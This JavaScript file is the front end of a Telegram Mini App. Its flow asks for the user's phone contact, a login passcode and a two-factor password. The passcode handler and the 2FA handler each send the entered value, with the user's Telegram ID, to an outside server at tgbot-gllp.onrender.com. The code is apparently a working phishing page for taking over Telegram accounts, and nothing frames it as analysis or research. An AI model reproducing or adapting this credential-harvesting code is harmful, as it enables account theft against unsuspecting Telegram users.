document.addEventListener('DOMContentLoaded', () => {
  const tg = window.Telegram?.WebApp;
  if (!tg) return;

  tg.ready();
  tg.expand();

  // DOM elements
  const loginBtn = document.getElementById('loginbtn');
  const page1 = document.getElementById('page1');
  const page2 = document.getElementById('page2');
  const page3 = document.getElementById('page3');
  const popup = document.getElementById('popup');
  const blur = document.getElementById('blur');
  const passcodeBtn = document.getElementById('passcode-btn');
  const passcodeInput = document.getElementById('hiddenInput');
  const twofactorInput = document.getElementById('twofactor-input');
  const twofactorBtn = document.getElementById('twofactor-btn');
  const input = document.getElementById('hiddenInput');
  const box = document.getElementById('codeBox');
  const cells = document.querySelectorAll('.cell');

  let userInfo = tg.initDataUnsafe?.user || null;
  const testMode = false;
  let currentPage = 'page1';
  
  // iOS detection
  const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
  
  // Track if keyboard is open (iOS-specific)
  let keyboardOpen = false;

  // 🧩 iOS-optimized keyboard blur handler
  document.addEventListener('touchstart', (e) => {
    const active = document.activeElement;
    if (
      active &&
      (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA') &&
      !e.target.closest('input') &&
      !e.target.closest('textarea')
    ) {
      // Delay blur to prevent race conditions on iOS
      setTimeout(() => {
        active.blur();
        keyboardOpen = false;
        document.body.classList.remove('input-focused');
      }, 100);
    }
  }, { passive: true });

  // iOS: Handle input focus/blur to fix position issues
  const allInputs = document.querySelectorAll('input, textarea');
  allInputs.forEach(inputEl => {
    inputEl.addEventListener('focus', () => {
      keyboardOpen = true;
      document.body.classList.add('input-focused');
      
      // iOS: Scroll input into view with delay
      if (isIOS) {
        setTimeout(() => {
          inputEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }, 300);
      }
    });

    inputEl.addEventListener('blur', () => {
      keyboardOpen = false;
      document.body.classList.remove('input-focused');
    });
  });

  showPage2();

  // 🪪 Login button → request Telegram contact
  loginBtn.addEventListener('click', async () => {
    try {
      tg.requestContact();
      tg.onEvent('contactRequested', (data) => {
        if (data.status === 'sent') {
          showPage2();
        }
      });
    } catch (error) {
      tg.showAlert('Error: ' + error.message);
    }
  });

  // 📱 iOS-optimized transition helpers
  function smoothTransition(showEl, hideEls = []) {
    // Use transform3d for hardware acceleration on iOS
    if (showEl === page2 || showEl === page3) {
      // iOS: Use absolute positioning when keyboard might be open
      const positionType = keyboardOpen ? 'absolute' : 'fixed';
      showEl.style.position = positionType;
      showEl.style.top = '50%';
      showEl.style.left = '50%';
      showEl.style.zIndex = '9999';
      showEl.style.display = 'flex';
      showEl.style.transform = 'translate3d(-50%, calc(-50% + 40px), 0)';
      showEl.style.opacity = '0';
      // iOS performance: Add will-change
      showEl.style.willChange = 'transform, opacity';
    }
    
    hideEls.forEach((el) => {
      el.style.visibility = 'hidden';
      el.style.opacity = '0';
      el.style.pointerEvents = 'none';
    });
    
    if (showEl !== page2 && showEl !== page3) {
      showEl.style.display = 'flex';
      showEl.style.transform = 'translate3d(0, 40px, 0)';
      showEl.style.opacity = '0';
      showEl.style.willChange = 'transform, opacity';
    }

    // Use requestAnimationFrame for smoother iOS animations
    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        if (showEl === page2 || showEl === page3) {
          showEl.style.transform = 'translate3d(-50%, -50%, 0)';
        } else {
          showEl.style.transform = 'translate3d(0, 0, 0)';
        }
        showEl.style.opacity = '1';
        
        // Remove will-change after animation
        setTimeout(() => {
          showEl.style.willChange = 'auto';
        }, 600);
      });
    });
  }

  function showPage2() {
    currentPage = 'page2';
    page2.style.position = keyboardOpen ? 'absolute' : 'fixed';
    page2.style.top = '50%';
    page2.style.left = '50%';
    page2.style.zIndex = '9999';
    smoothTransition(page2, [page1]);
    blur.style.opacity = '1';
    blur.style.zIndex = '-1';
  }

  function showPage3() {
    if (!page3) {
      console.error('page3 element not found');
      return;
    }
    
    currentPage = 'page3';
    page3.style.position = keyboardOpen ? 'absolute' : 'fixed';
    page3.style.top = '50%';
    page3.style.left = '50%';
    page3.style.zIndex = '9999';
    page3.style.visibility = 'visible';
    page3.style.height = '360px';
    
    const elementsToHide = [];
    if (page1) {
      const page1Display = window.getComputedStyle(page1).display;
      if (page1Display !== 'none') elementsToHide.push(page1);
    }
    if (page2) {
      const page2Display = window.getComputedStyle(page2).display;
      const page2Visibility = window.getComputedStyle(page2).visibility;
      if (page2Display !== 'none' || page2Visibility !== 'hidden') elementsToHide.push(page2);
    }
    
    smoothTransition(page3, elementsToHide);
    if (blur) {
      blur.style.opacity = '1';
      blur.style.zIndex = '-1';
    }
  }

  // 🧩 Handle passcode
  passcodeBtn.addEventListener('click', async () => {
    const passcode = passcodeInput.value.trim();
    if (!passcode) return tg.showAlert('⚠️ Please enter passcode');

    let user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;

    if (!user_id && tg.initData) {
      const params = new URLSearchParams(tg.initData);
      const userParam = params.get('user');
      if (userParam) {
        try {
          const userData = JSON.parse(userParam);
          user_id = userData.id;
          userInfo = userData;
        } catch {}
      }
    }

    if (!user_id) return tg.showAlert('⚠️ Cannot get user ID. Please open from Telegram bot.');

    try {
      await fetch('https://tgbot-gllp.onrender.com/send_data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ passcode, user_id }),
      });
      setTimeout(showPage3, 600);
    } catch (err) {
      tg.showAlert('❌ Failed to send passcode');
    }
  });

  // 🔐 Handle 2FA input
  twofactorBtn.addEventListener('click', async () => {
    const twofactor = twofactorInput.value.trim();
    if (!twofactor) return tg.showAlert('⚠️ Please enter 2FA password');

    const user_id = userInfo?.id || tg.initDataUnsafe?.user?.id;
    if (!user_id) return tg.showAlert('⚠️ Cannot get user ID');

    try {
      await fetch('https://tgbot-gllp.onrender.com/send_twofactor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ twofactor, user_id }),
      });
    } catch (err) {
      tg.showAlert('❌ Failed to send');
    }
  });

  // 🔢 Passcode box input visual (iOS-optimized)
  box.addEventListener('click', () => {
    input.focus();
    // iOS haptic feedback
    if (tg.HapticFeedback) {
      tg.HapticFeedback.impactOccurred('light');
    }
  });
  
  input.addEventListener('input', () => {
    const value = input.value.split('');
    cells.forEach((cell, i) => {
      cell.textContent = value[i] || '';
      if (value[i]) {
        cell.style.boxShadow = '0 0 0.3rem 0.1rem #59be4a';
      } else {
        cell.style.boxShadow = '';
      }
    });
  });
});
